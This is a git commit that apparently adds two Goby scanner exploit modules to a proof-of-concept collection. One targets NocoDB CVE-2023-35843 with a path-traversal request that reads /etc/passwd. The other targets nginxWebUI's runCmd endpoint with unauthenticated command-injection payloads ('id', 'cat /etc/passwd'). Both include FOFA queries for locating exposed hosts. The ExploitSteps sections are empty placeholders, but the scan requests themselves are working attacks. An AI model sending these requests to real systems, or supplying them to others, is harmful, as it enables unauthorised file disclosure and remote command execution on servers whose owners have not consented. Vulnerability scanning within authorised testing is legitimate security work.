3896f622de72452ef86c03c833e9ebf8c01e1bf9
清晨 <37011241+qingchenhh@users.noreply.github.com>
2023-06-28 20:03:39 +0800

    Add files via upload

---
+++ Goby/NocoDB_file_read_CVE_2023_35843.go
@@ -0,0 +1,144 @@
+package exploits
+
+import (
+	"git.gobies.org/goby/goscanner/goutils"
+)
+
+func init() {
+	expJson := `{
+  "Name": "NocoDB 任意文件读取漏洞CVE-2023-35843",
+  "Description": "",
+  "Product": "",
+  "Homepage": "",
+  "DisclosureDate": null,
+  "PostTime": "2023-06-28",
+  "Author": "清晨",
+  "FofaQuery": "\"Nocodb\"",
+  "GobyQuery": "\"Nocodb\"",
+  "Level": "2",
+  "Impact": "",
+  "Recommendation": "",
+  "References": [],
+  "Is0day": false,
+  "HasExp": false,
+  "ExpParams": [],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/download/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+        "follow_redirect": false,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "root:",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    }
+  ],
+  "ExploitSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/test.php",
+        "follow_redirect": true,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "test",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    }
+  ],
+  "Tags": [],
+  "VulType": [],
+  "CVEIDs": [
+    ""
+  ],
+  "CNNVD": [
+    ""
+  ],
+  "CNVD": [
+    ""
+  ],
+  "CVSSScore": "",
+  "Translation": {
+    "CN": {
+      "Name": "NocoDB 任意文件读取漏洞CVE-2023-35843",
+      "Product": "",
+      "Description": "",
+      "Recommendation": "",
+      "Impact": "",
+      "VulType": [],
+      "Tags": []
+    },
+    "EN": {
+      "Name": "NocoDB file read CVE-2023-35843",
+      "Product": "",
+      "Description": "",
+      "Recommendation": "",
+      "Impact": "",
+      "VulType": [],
+      "Tags": []
+    }
+  },
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}`
+
+	ExpManager.AddExploit(NewExploit(
+		goutils.GetFileName(),
+		expJson,
+		nil,
+		nil,
+	))
+}
---
+++ Goby/nginxWebUI_runCmd_rce.go
@@ -0,0 +1,175 @@
+package exploits
+
+import (
+	"git.gobies.org/goby/goscanner/goutils"
+)
+
+func init() {
+	expJson := `{
+  "Name": "nginxWebUI runCmd 远程命令执行漏洞",
+  "Description": "",
+  "Product": "",
+  "Homepage": "",
+  "DisclosureDate": null,
+  "PostTime": "2023-06-28",
+  "Author": "清晨",
+  "FofaQuery": "product=\"nginxWebUI\" || \"nginxWebUI\"",
+  "GobyQuery": "product=\"nginxWebUI\" || \"nginxWebUI\"",
+  "Level": "3",
+  "Impact": "",
+  "Recommendation": "",
+  "References": [],
+  "Is0day": false,
+  "HasExp": false,
+  "ExpParams": [],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "OR",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/AdminPage/conf/runCmd?cmd=id%26%26echo%20nginx",
+        "follow_redirect": false,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "uid=",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    },
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/AdminPage/conf/runCmd?cmd=cat /etc/passwd%26%26echo%20nginx",
+        "follow_redirect": false,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "root:",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    }
+  ],
+  "ExploitSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/test.php",
+        "follow_redirect": true,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "test",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    }
+  ],
+  "Tags": [],
+  "VulType": [],
+  "CVEIDs": [
+    ""
+  ],
+  "CNNVD": [
+    ""
+  ],
+  "CNVD": [
+    ""
+  ],
+  "CVSSScore": "",
+  "Translation": {
+    "CN": {
+      "Name": "nginxWebUI runCmd 远程命令执行漏洞",
+      "Product": "",
+      "Description": "",
+      "Recommendation": "",
+      "Impact": "",
+      "VulType": [],
+      "Tags": []
+    },
+    "EN": {
+      "Name": "nginxWebUI runCmd rce",
+      "Product": "",
+      "Description": "",
+      "Recommendation": "",
+      "Impact": "",
+      "VulType": [],
+      "Tags": []
+    }
+  },
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}`
+
+	ExpManager.AddExploit(NewExploit(
+		goutils.GetFileName(),
+		expJson,
+		nil,
+		nil,
+	))
+}
